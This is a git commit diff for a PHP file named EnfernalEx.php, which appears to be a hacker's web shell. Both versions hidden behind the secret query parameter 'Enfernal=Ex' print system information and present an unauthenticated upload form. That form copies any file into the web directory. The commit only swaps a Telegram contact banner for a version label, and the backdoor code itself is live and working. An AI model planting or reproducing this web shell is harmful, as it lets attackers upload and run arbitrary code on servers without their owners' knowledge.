3cd5dff636ed82e3a9186077c15f959adfb7e0a6
f4ruk1453decodex <133605406+f4ruk1453decodex@users.noreply.github.com>
2023-05-30 20:13:35 +0300

    Update EnfernalEx.php

--- EnfernalEx.php
+++ EnfernalEx.php
@@ -1,5 +1,5 @@
 <?php 
 if ($_GET['Enfernal'] == 'Ex'){
-    echo '<pre><p>Telegram : @N0NL0C4L</p>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'Uploaded';}else{echo 'Not Uploaded';}}
+    echo '<pre><p>EnfernalExV1</p>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'Uploaded';}else{echo 'Not Uploaded';}}
 }
 ?>
